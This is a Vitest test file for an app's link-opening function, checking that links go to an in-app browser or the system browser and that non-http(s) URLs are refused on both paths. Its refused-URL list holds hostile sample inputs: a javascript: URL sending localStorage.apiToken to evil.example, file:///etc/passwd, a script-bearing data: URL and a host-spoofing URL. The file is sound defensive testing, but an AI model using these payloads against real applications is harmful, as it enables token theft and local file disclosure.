// A link opens the way the user chose, which the surface playing the `browser` role knows from its own settings: the
// SDK hands it the link and reads no surface's state itself.
import { afterEach, describe, expect, it, vi } from 'vitest';
import { openLink } from '../../src/fe/navigation.ts';
import { bindFeHost, unbindFeHost } from '../../src/runtime/fe-host.ts';

function bindWith(browserRole: string | undefined) {
  const received: unknown[] = [];
  const browser = { send: (event: unknown) => received.push(event) };
  const openExternal = vi.fn();
  (globalThis as any).window = { electronAPI: { shell: { openExternal } } };
  bindFeHost({ catalog: {} as never,
    application: { system: { get: (id: string) => (id === browserRole ? browser : undefined) } } as never,
    secrets: {} as never,
    settings: {} as never,
    client: { send() {}, watchView: () => () => {} },
    packs: { designation: (role: string) => (role === 'browser' ? browserRole : undefined) } as never,
  });
  return { received, openExternal };
}

afterEach(() => {
  unbindFeHost();
  delete (globalThis as any).window;
});

describe('openLink', () => {
  it('hands the link to the surface playing the browser role, which decides where it opens', () => {
    const { received, openExternal } = bindWith('default-setup/browser');
    openLink('https://example.com');
    expect(received).toEqual([{ type: 'LINK.OPEN', url: 'https://example.com' }]);
    expect(openExternal).not.toHaveBeenCalled();
  });

  it("opens it in the system's browser when no surface plays the role", () => {
    const { openExternal } = bindWith(undefined);
    openLink('https://example.com');
    expect(openExternal).toHaveBeenCalledWith('https://example.com');
  });

  /**
   * **S4**: the scheme was checked only on the external branch, so a `javascript:` or `file:` URL was refused
   * by the system browser and handed straight to an in-app tab — which runs in the app window, where the API
   * token is. Both branches are asserted per URL, because the defect was that they disagreed.
   */
  it('refuses a URL that is not an http(s) link, whichever branch would have taken it', () => {
    const refused = [
      'javascript:fetch("//evil.example?t="+localStorage.apiToken)',
      'file:///etc/passwd',
      'data:text/html,<script>alert(1)</script>',
      'apack://install?pack=evil',
      'not a url at all',
      // The host this reads as is evil.example, not apple.com
      'https://apple.com@evil.example/',
    ];

    for (const url of refused) {
      const withBrowser = bindWith('default-setup/browser');
      openLink(url);
      expect(withBrowser.received, `${url} reached an in-app tab`).toEqual([]);
      expect(withBrowser.openExternal, `${url} reached the system browser`).not.toHaveBeenCalled();
      unbindFeHost();

      const withoutBrowser = bindWith(undefined);
      openLink(url);
      expect(withoutBrowser.openExternal, `${url} reached the system browser`).not.toHaveBeenCalled();
      unbindFeHost();
    }
  });

  // The population half: a rule that refused everything would satisfy the case above while breaking the app
  it('still opens the links the app actually shows', () => {
    for (const url of ['https://example.com/a?b=c', 'http://localhost:5173/', 'https://docs.apack.dev/x#y']) {
      const { received } = bindWith('default-setup/browser');
      openLink(url);
      expect(received, url).toEqual([{ type: 'LINK.OPEN', url }]);
      unbindFeHost();
    }
  });
});
